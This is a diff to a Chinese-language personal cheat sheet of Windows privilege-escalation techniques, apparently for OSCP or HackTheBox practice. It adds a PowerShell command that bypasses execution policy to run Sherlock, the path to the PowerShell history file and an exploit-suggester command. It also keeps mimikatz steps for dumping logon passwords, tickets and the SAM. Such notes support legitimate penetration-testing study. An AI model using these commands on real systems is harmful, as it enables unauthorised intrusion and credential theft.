@@ -1,6 +1,7 @@
 1.bounty的MSFRootenRotato.exe
 2.Arctic的Chimichurry.exe
 3.sherlock查看漏洞訊息
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File sherlock.ps1
 4.winPEAS.exe像是suggester查看漏洞訊息
 5.accesschk 提權方式,參考oscp2/10.11.1.14
 6.Bypass UAC 參考oscp2/10.11.1.21
@@ -12,10 +13,15 @@ whoami /priv查看有哪些提權限方式,根據以下可提權
 https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
 11. NSC client,網頁服務執行代碼(參考servMon)
 12. ZKAccess3.5 Security System.lnk "Shortcut" 超連接內容提權
-
+13. 查看歷史命令紀錄
+C:\Users\student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+14./windows-exploit-suggester.py --database 2021-03-06-mssb.xls --systeminfo /home/kali/vdi.txt
 mimikatz用法：
 1.檢查有無權限privilege::debug
 2.若有報錯需要使用mimikatz_trunk
 3.sekurlsa::logonpasswords
 4.sekurlsa::tickets
 5.lsadump::sam
+
+###windows 提權限參考
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
